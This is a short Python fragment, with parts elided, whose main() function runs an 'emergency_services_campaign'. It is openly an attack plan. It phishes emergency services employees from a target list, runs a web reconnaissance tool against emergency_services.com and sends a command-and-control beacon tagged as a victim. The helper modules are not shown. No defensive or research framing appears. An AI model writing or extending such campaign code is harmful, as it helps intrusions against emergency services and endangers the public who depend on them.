...
def main():
    """
    Main function to run the emergency_services_campaign campaign.
    """
    print(f"[*] Starting emergency_services_campaign campaign...")

    # 1. Initial Access
    print("[*] Phase 1: Initial Access")
    initial_access.phishing_attack("emergency_services_employees.txt")
    run_tool("apt_web_recon.js", "--target emergency_services.com")
    ...
    command_control.send_beacon(c2_server, "VICTIM-EMERGENCY_SERVICES-01")
